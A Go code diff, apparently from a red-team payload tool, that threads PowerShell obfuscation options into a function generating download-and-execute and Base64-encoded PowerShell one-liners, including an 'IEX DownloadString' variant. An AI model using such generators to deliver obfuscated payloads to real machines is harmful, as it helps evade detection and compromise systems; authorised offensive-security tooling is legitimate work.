@@ -172,6 +172,13 @@ type oneLinerItem struct {
 // the hash after download/resume and only executes on match, and curl-based
 // variants use -C - so interrupted downloads resume instead of restarting.
 func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy, sha256hex string) []oneLinerItem {
+	return buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, proxy, sha256hex, obfuscation.PSObfuscateOptions{})
+}
+
+// buildOneLinersWithObfuscation is buildOneLiners with an explicit PowerShell
+// obfuscation preset for the self-contained Base64 variant. All other
+// variants are unchanged.
+func buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, proxy, sha256hex string, psOpts obfuscation.PSObfuscateOptions) []oneLinerItem {
 	var items []oneLinerItem
 
 	switch payloadType {
@@ -254,7 +261,7 @@ func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy, sha256hex
 		items = append(items, oneLinerItem{
 			Name:    "PowerShell Base64 (Self-Contained)",
 			Desc:    "Built-in Base64 encoded PS1 script, no download needed",
-			Command: obfuscation.GenerateCommandLineOneLiner(ps1Code),
+			Command: obfuscation.GenerateCommandLineOneLinerWithOptions(ps1Code, psOpts),
 		})
 		items = append(items, oneLinerItem{
 			Name: "IEX DownloadString + Proxy",
